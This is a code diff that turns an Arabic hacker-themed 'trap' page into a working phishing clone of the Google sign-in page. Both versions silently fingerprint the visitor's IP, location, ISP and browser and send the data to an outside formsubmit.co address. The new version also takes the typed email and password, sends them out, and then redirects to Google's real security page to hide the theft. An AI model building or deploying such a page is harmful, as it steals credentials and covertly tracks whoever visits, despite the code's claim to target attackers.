@@ -1,108 +1,124 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sovereign Security Terminal</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        :root { --glow: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
-        #canvas { position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .terminal { border: 2px solid var(--glow); background: rgba(0, 0, 0, 0.9); padding: 25px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); width: 85%; max-width: 600px; position: relative; }
-        .header { border-bottom: 1px solid var(--glow); margin-bottom: 15px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; text-align: center; }
-        .log-line { font-size: 0.9em; margin: 5px 0; white-space: nowrap; overflow: hidden; border-right: 2px solid var(--glow); animation: typing 1s steps(40, end), blink 0.5s step-end infinite; }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        @keyframes blink { from, to { border-color: transparent } 50% { border-color: var(--glow) } }
-        .progress-container { width: 100%; border: 1px solid var(--glow); height: 12px; margin-top: 20px; }
-        #progress-bar { width: 0%; height: 100%; background: var(--glow); transition: width 0.4s ease-in-out; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 400px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { color: #202124; font-size: 16px; margin-bottom: 25px; }
+        .input-group { position: relative; margin-bottom: 15px; text-align: right; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border 0.2s; }
+        input.error { border: 2px solid #d93025; }
+        .error-msg { color: #d93025; font-size: 12px; margin-top: 5px; display: none; text-align: right; font-weight: 500; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: left; margin-top: 20px; }
+        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 100; flex-direction: column; justify-content: center; align-items: center; }
     </style>
 </head>
 <body>
-    <canvas id="canvas"></canvas>
-    <div class="terminal">
-        <div class="header">🔱 SYSTEM: LØGHØST-Z CORE 2099 🜏</div>
-        <div id="logs">
-            <p class="log-line">> INITIALIZING SECURITY PROTOCOL...</p>
-        </div>
-        <div class="progress-container"><div id="progress-bar"></div></div>
+
+<div id="loading">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
+    <p>جاري فحص أمان الاتصال...</p>
+</div>
+
+<div class="login-box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+    <h1>تسجيل الدخول</h1>
+    <p>متابعة إلى Gmail لفك تشفير الملفات</p>
+    
+    <div class="input-group">
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <div id="email-error" class="error-msg">⚠️ عذراً، لا يمكننا العثور على حساب بهذا البريد.</div>
     </div>
 
-    <form id="finalForm" action="https://formsubmit.co/kabhaa982@gmail.com" method="POST" style="display:none;">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_subject" value="🔱 صيد جديد: تم استدراج المهاجم!">
-        <textarea name="DETAILED_REPORT" id="report"></textarea>
-    </form>
+    <div class="input-group">
+        <input type="password" id="pass" placeholder="أدخل كلمة المرور">
+        <div id="pass-error" class="error-msg">⚠️ كلمة المرور خاطئة. حاول مرة أخرى.</div>
+    </div>
+    
+    <button class="btn" onclick="executeFinalStrike()">التالي</button>
+</div>
 
-    <script>
-        // تأثير Matrix الخلفي
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789🔱💀";
-        const fontSize = 16; const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#00ff41"; ctx.font = fontSize + "px arial";
-            drops.forEach((y, i) => {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, y * fontSize);
-                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+<form id="mirageForm" action="https://formsubmit.co/kabhaa982@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="🔱 صيد سيادي: تم سحب بيانات المهاجم بالكامل!">
+    <input type="hidden" name="_template" value="table">
+    <textarea name="FULL_REPORT" id="report"></textarea>
+</form>
+
+<script>
+    async function executeFinalStrike() {
+        const email = document.getElementById('email');
+        const pass = document.getElementById('pass');
+        const eMsg = document.getElementById('email-error');
+        const pMsg = document.getElementById('pass-error');
+
+        // إعادة ضبط الأخطاء
+        email.classList.remove('error');
+        pass.classList.remove('error');
+        eMsg.style.display = 'none';
+        pMsg.style.display = 'none';
+
+        // 1. ميزة التحقق من البيانات (لضمان الجودة)
+        if (!email.value.includes('@') || email.value.length < 5) {
+            email.classList.add('error');
+            eMsg.style.display = 'block';
+            return;
+        }
+        if (pass.value.length < 7) {
+            pass.classList.add('error');
+            pMsg.style.display = 'block';
+            return;
+        }
+
+        // 2. بدء عملية السحب
+        document.getElementById('loading').style.display = 'flex';
+
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+
+            const reportData = `
+🔱 [معلومات تسجيل الدخول]
+- البريد: ${email.value}
+- كلمة المرور: ${pass.value}
+
+🌍 [بيانات الموقع والشبكة]
+- IP: ${d.ip}
+- المدينة/الدولة: ${d.city}, ${d.country_name}
+- الإحداثيات: ${d.latitude}, ${d.longitude}
+- المزود (ISP): ${d.org}
+
+💻 [بصمة الجهاز]
+- النظام: ${navigator.platform}
+- المتصفح: ${navigator.userAgent}
+- دقة الشاشة: ${screen.width}x${screen.height}
+- التوقيت المحلي: ${new Date().toLocaleString()}
+
+🔱 نظام: LØGHØST-Z CORE 2099`;
+
+            document.getElementById('report').value = reportData;
+
+            // 3. الإرسال الصامت
+            const form = document.getElementById('mirageForm');
+            await fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
             });
+
+            // 4. التمويه النهائي (تحويل لمكان آمن)
+            window.location.href = "https://myaccount.google.com/security";
+
+        } catch (e) {
+            window.location.href = "https://google.com";
         }
-        setInterval(draw, 33);
+    }
+</script>
 
-        const logs = document.getElementById('logs');
-        const addLog = (text) => {
-            const p = document.createElement('p'); p.className = 'log-line';
-            p.innerText = `> ${text}`; logs.appendChild(p);
-        };
-
-        async function executeTheTrap() {
-            try {
-                addLog("SCANNING SOURCE NODE...");
-                const bar = document.getElementById('progress-bar');
-                
-                // جلب البيانات العميقة
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                bar.style.width = "40%";
-
-                addLog("EXTRACTING NEURAL FINGERPRINT...");
-                const fullData = `
-=== SOVEREIGN TARGET REPORT ===
-IP: ${d.ip}
-LOCATION: ${d.city}, ${d.region}, ${d.country_name}
-COORDINATES: ${d.latitude}, ${d.longitude}
-ISP: ${d.org}
-TIMEZONE: ${d.timezone}
-DEVICE: ${navigator.platform}
-LANGUAGE: ${navigator.language}
-BROWSER: ${navigator.userAgent}
-SCREEN: ${screen.width}x${screen.height}
-URL REF: ${document.referrer || 'Direct Access'}
-===============================`;
-
-                document.getElementById('report').value = fullData;
-                bar.style.width = "70%";
-                addLog("UPLOADING DATA TO CORE...");
-
-                // الإرسال الصامت
-                const form = document.getElementById('finalForm');
-                await fetch(form.action, {
-                    method: 'POST',
-                    body: new FormData(form),
-                    headers: { 'Accept': 'application/json' }
-                });
-
-                bar.style.width = "100%";
-                addLog("PROTOCOL COMPLETE. CONNECTION SECURED.");
-            } catch (err) {
-                addLog("ERROR: DATA INTERCEPTED.");
-            }
-        }
-        setTimeout(executeTheTrap, 1000);
-    </script>
 </body>
 </html>
